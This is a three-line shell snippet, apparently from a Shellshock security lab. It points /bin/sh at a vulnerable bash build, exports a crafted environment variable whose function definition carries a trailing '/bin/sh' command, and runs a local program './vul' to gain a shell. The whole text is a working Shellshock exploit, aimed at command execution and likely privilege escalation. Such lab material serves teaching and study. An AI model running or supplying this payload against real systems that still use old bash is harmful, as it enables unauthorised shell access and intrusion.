sudo ln -sf /bin/bash_shellshock /bin/sh
export foo='() { echo "Hello"; }; /bin/sh;'
./vul
